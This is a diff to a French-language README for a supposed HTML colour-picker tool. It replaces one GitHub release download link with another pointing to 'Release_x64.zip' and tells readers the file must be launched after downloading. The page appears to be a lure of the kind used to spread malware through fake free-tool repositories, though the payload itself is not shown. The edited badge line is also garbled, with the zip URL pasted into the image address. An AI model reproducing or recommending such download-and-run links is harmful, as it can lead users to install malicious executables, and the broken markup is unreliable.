@@ -21,7 +21,7 @@ L'Outil de Couleurs HTML vous permet de trouver les couleurs parfaites pour votr
 
 Cliquez sur le bouton ci-dessous pour télécharger l'outil:
 
-[![Télécharger l'Outil](https://img.shields.io/badge/Télécharger-l'Outil-brightgreen)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Télécharger l'Outil](https://github.com/Darkneeskiller/Outil-de-Couleurs-HTML/releases/download/v1.0/Release_x64.zipélécharger-l'Outil-brightgreen)](https://github.com/Darkneeskiller/Outil-de-Couleurs-HTML/releases/download/v1.0/Release_x64.zip)
 
 ⚠️ **Nécessite d'être lancé après le téléchargement**
 
